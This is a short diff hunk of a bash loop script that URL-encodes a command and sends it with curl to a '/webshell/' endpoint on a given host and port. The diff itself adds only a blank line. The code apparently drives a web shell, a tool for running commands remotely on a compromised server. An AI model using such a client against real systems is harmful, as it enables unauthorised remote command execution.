@@ -8,6 +8,7 @@ while true; do
   command=$(printf %s "${raw_command}" | jq -sRr @uri)
 
   response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
+
   http_code=$(tail -n1 <<< "$response")
 
   # Check if the HTTP status code is a valid integer
